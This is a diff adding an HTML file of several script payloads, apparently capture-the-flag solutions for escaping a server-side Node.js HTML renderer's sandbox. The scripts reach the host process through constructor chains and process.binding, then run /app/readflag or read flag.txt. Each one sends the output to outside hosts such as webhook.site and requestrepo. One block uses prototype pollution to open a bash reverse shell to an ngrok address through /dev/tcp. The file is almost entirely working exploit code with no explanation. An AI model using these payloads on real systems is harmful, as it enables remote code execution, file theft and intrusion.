@@ -1,0 +1,66 @@
+<!DOCTYPE html>
+<html>
+
+<body <script>
+    const f = this.constructor.constructor;
+    const fetch = f('return fetch')();
+    const process = f('return process')();
+    let flag = process.binding('spawn_sync').spawn({file: '/bin/bash',args: ['/bin/bash', '-c', '/app/readflag'], stdio:
+    [{type:'pipe',readable:!0,writable:!1},{type:'pipe',readable:!1,writable:!0},{type:'pipe',readable:!1,writable:!0}]}).output[1].toString()
+    fetch('https://foo?flag=' + flag).then(r => r.text())
+    </script>
+</body>
+
+</html>
+
+<script>
+    window._globalObject.__proto__.__proto__.__proto__.argv0 = "require('child_process').execSync('bash -c \"bash -i >& /dev/tcp/8.tcp.ngrok.io/13228 0>&1\"')//";
+    window._globalObject.__proto__.__proto__.__proto__.shell = "/proc/self/exe";
+    window._globalObject.__proto__.__proto__.__proto__.NODE_OPTIONS = "--require /proc/self/cmdline";
+    const req = new XMLHttpRequest();
+    req.open('GET', 'http://6z53w008.requestrepo.com/', false);
+    req.send();
+</script>
+
+
+<script>
+    const outerRealmFunctionConstructor = Node.constructor;
+    const process = outerRealmFunctionConstructor('return process')();
+    const fetch = outerRealmFunctionConstructor('return fetch')();
+
+    // Source: https://github.com/nodejs/node/blob/master/lib/child_process.js
+
+    // Defines spawn_sync and normalizeSpawnArguments (without error handling). These are internal variables.
+    spawn_sync = process.binding('spawn_sync'); normalizeSpawnArguments = function (c, b, a) { if (Array.isArray(b) ? b = b.slice(0) : (a = b, b = []), a === undefined && (a = {}), a = Object.assign({}, a), a.shell) { const g = [c].concat(b).join(' '); typeof a.shell === 'string' ? c = a.shell : c = '/bin/sh', b = ['-c', g]; } typeof a.argv0 === 'string' ? b.unshift(a.argv0) : b.unshift(c); var d = a.env || process.env; var e = []; for (var f in d) e.push(f + '=' + d[f]); return { file: c, args: b, options: a, envPairs: e }; }
+
+    // Defines spawnSync, the function that will do the actual spawning
+    spawnSync = function () { var d = normalizeSpawnArguments.apply(null, arguments); var a = d.options; var c; if (a.file = d.file, a.args = d.args, a.envPairs = d.envPairs, a.stdio = [{ type: 'pipe', readable: !0, writable: !1 }, { type: 'pipe', readable: !1, writable: !0 }, { type: 'pipe', readable: !1, writable: !0 }], a.input) { var g = a.stdio[0] = util._extend({}, a.stdio[0]); g.input = a.input; } for (c = 0; c < a.stdio.length; c++) { var e = a.stdio[c] && a.stdio[c].input; if (e != null) { var f = a.stdio[c] = util._extend({}, a.stdio[c]); isUint8Array(e) ? f.input = e : f.input = Buffer.from(e, a.encoding); } } console.log(a); var b = spawn_sync.spawn(a); if (b.output && a.encoding && a.encoding !== 'buffer') for (c = 0; c < b.output.length; c++) { if (!b.output[c]) continue; b.output[c] = b.output[c].toString(a.encoding); } return b.stdout = b.output && b.output[1], b.stderr = b.output && b.output[2], b.error && (b.error = b.error + 'spawnSync ' + d.file, b.error.path = d.file, b.error.spawnargs = d.args.slice(1)), b; }
+
+    const flag = spawnSync('./readflag').stdout.toString();
+    fetch('https://webhook.site/censored/' + flag);
+</script>
+
+
+<script>
+    let fetch = this.constructor.constructor('return fetch')();
+    let Buffer = this.constructor.constructor('return Buffer')();
+    let process = this.constructor.constructor('return process')();
+    let fs = process.binding('fs');
+
+    const path = 'flag.txt';
+    const bufferSize = 1024;
+
+    const fileDescriptor = fs.open(path, 0, 0, 0, 0);
+
+    console.log('fd', fileDescriptor)
+
+    const buffer = Buffer.alloc(bufferSize);
+    const bytesRead = fs.read(fileDescriptor, buffer, 0, bufferSize, 0, 0, 0);
+
+    console.log('br', bytesRead)
+
+    const fileContent = buffer.toString('utf8', 0, bytesRead);
+    console.log('File content:', fileContent);
+
+    fetch('https://webhook.site/<my-uuid-here>?data=' + fileContent)
+</script>
